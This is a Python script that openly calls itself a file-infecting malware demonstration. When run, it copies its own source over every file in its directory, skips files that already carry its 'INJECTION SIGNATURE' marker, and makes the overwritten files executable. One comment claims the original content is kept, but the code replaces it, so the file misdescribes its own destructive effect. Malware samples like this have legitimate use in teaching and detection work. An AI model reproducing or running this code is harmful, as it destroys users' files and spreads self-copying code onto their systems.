#!/usr/bin/env python3

""" Implementation of file infector in Python.
    INJECTION SIGNATURE
"""

import logging
import os
import sys
from cached_property import cached_property


class FileInfector:
    """ This class represents the code injecting malware.
    """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @cached_property
    def malicious_code(self):
        """ Malicious code. In the case of this file
        injector it is this whole file.
        """
        # Get the name of this file.
        malicious_file = sys.argv[0]
        with open(malicious_file, 'r') as file:
            malicious_code = file.read()

        return malicious_code

    def infect_files_in_folder(self, path):
        """ Perform file infection on all files in the
        given directory specified by path.

        :param str path: Path of the folder to be infected.
        :returns: Number of injected files (`int`).
        """
        num_infected_files = 0
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # For the demostration purposes ignore README.md
            # from the repository.
            if file == 'README.md':
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        # Inject each file in the directory.
        for file in files:
            logging.debug('Infecting file: {}'.format(file))

            # Read the content of the original file.
            with open(file, 'r') as infected_file:
                file_content = infected_file.read()
            # Check whether the file was already infected by scanning
            # the injection signature in this file. If so, skip the file.
            if "INJECTION SIGNATURE" in file_content:
                continue

            # Ensure that the injected file is executable.
            os.chmod(file, 777)

            # Write the original and malicous part into the file.
            with open(file, 'w') as infected_file:
                infected_file.write(self.malicious_code)

            num_infected_files += 1

        return num_infected_files


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create file injector.
    code_injector = FileInfector('SimpleFileInfector')

    # Infect all files in the same folder.
    path = os.path.dirname(os.path.abspath(__file__))
    number_infected_files = code_injector.infect_files_in_folder(path)

    logging.info('Number of infected files: {}'.format(number_infected_files))
